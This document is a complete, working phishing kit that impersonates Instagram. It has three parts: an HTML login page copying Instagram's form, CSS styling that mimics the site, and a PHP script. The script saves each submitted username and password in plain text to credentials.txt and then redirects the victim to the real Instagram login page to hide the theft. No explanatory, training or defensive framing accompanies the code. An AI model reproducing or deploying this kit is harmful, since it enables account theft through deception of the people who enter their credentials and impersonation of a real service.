<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <form action="capture.php" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
body {
    font-family: Arial, sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.login-container {
    background-color: #fff;
    padding: 20px;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    width: 350px;
    text-align: center;
}

.login-container form {
    display: flex;
    flex-direction: column;
}

.login-container input {
    margin-bottom: 10px;
    padding: 10px;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    font-size: 14px;
}

.login-container button {
    padding: 10px;
    background-color: #0095f6;
    border: none;
    border-radius: 4px;
    color: #fff;
    font-size: 14px;
    cursor: pointer;
}

.login-container button:hover {
    background-color: #0084d4;
}
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log the credentials to a file
    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);

    // Redirect to the real Instagram login page
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>
